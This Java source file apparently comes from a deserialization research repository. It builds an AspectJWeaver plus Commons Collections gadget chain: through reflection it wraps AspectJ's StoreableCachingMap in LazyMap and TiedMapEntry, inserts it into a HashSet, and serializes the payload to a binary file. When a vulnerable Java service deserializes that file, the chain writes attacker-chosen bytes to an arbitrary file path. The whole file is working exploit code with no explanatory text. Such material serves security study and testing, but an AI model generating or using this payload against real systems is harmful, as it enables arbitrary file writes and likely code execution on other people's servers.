package Seri;

import org.apache.commons.collections.Factory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class AspectJWeaver2 {
    public static void main(String[] args) throws Exception {
        String content = "xxxx";
        byte[] bytes = content.getBytes();

        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructor(String.class ,int.class);
        constructor.setAccessible(true);
        HashMap storeableCachingMap = (HashMap) constructor.newInstance("/tmp" ,60000);

        ConstantTransformer constantTransformer = new ConstantTransformer(bytes);
        Map lazyMap = LazyMap.decorate(storeableCachingMap ,constantTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap ,"Filename0");

        HashSet hashSet = new HashSet(1);
        hashSet.add("xxx");

        Field setMap = hashSet.getClass().getDeclaredField("map");
        setMap.setAccessible(true);
        HashMap hashMap = (HashMap) setMap.get(hashSet);
        Field setTable = hashMap.getClass().getDeclaredField("table");
        setTable.setAccessible(true);
        Object[] table = (Object[]) setTable.get(hashMap);
        Object Node = table[1];
        Field setKey = Node.getClass().getDeclaredField("key");
        setKey.setAccessible(true);

        setKey.set(Node, tiedMapEntry);


        Utils.serialize(hashSet ,"bin/AspectJWeaver2.bin");
//        Utils.unserialize("bin/AspectJWeaver2.bin");




    }
}
